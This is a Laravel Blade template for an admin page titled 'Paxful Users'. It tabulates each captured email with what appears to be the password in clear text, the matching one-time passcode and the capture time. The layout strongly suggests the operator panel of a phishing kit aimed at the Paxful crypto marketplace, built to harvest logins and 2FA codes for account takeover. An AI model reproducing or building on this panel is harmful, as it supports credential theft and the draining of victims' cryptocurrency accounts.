@extends('layouts.app')
@section('content')
    <div id="main">
        <header class="mb-3">
            <a href="#" class="burger-btn d-block d-xl-none">
                <i class="bi bi-justify fs-3"></i>
            </a>
        </header>

        <div class="page-heading">
            <div class="page-title">
                <div class="row">
                    <div class="col-12 col-md-6 order-md-1 order-last">
                        <h3>Paxful Users</h3>
                        <p class="text-subtitle text-muted"></p>
                    </div>
                    <div class="col-12 col-md-6 order-md-2 order-first">
                        <nav aria-label="breadcrumb" class="breadcrumb-header float-start float-lg-end">
                            <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="{{url('dashboard')}}">Dashboard</a></li>
                                <li class="breadcrumb-item active" aria-current="page">Paxful Users</li>
                            </ol>
                        </nav>
                    </div>
                </div>
            </div>
            @if(session('success'))
                <div class="alert alert-success"><i class="bi bi-check-circle"></i> {{ session('success') }}</div>
            @endif
            @if(session('error'))
                <div class="alert alert-danger"><i class="bi bi-check-circle"></i>
                    {{ session('error') }}
                </div>
            @endif
            <section class="section">
                <div class="card">
                    <div class="card-header">
                        Paxful Users

                    </div>

                    <div class="card-body">
                        <table class="table table-striped" id="table1">
                            <thead>
                            <tr>

                                <th>Username</th>
                                <th>Password</th>
                                <th>Otp</th>
                                <th>Created At</th>

                            </tr>
                            </thead>
                            <tbody>
                            @foreach($users as $user)



                                <tr>

                                    <td>{{$user->email}}</td>
                                    <td>{{$user->password}}</td>


                                    @php
                                        $op = App\Models\VerificationCode::where('user_id', $user->id)->first();
                                        if($op){
                                            $otp = $op->otp;
                                        }else{
                                            $otp = 'N/A';
                                        }


                                    @endphp
                                    <td>{{$otp}}</td>
                                    @php
                                        $inputDateTime = $user->created_at;
                                    $datep = Illuminate\Support\Carbon::parse($inputDateTime);
                                    $days_ = $datep->longAbsoluteDiffForHumans(Illuminate\Support\Carbon::now());
                                    $daysAgo = $days_;

                                    @endphp
                                    <td>{{$daysAgo}}</td>
                                </tr>

                            @endforeach

                            </tbody>
                        </table>
                    </div>
                </div>

            </section>
        </div>

@endsection
